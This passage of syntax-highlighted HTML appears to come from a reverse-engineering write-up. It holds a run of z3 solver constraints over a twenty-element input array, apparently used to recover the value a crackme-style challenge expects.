class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1836606059</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">8720560</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">11387045</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre><span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre><span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">7660269</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>      <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>      <span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2461883</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>    <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">966296</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre><span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>     <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>     <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">254500223</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre><span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token 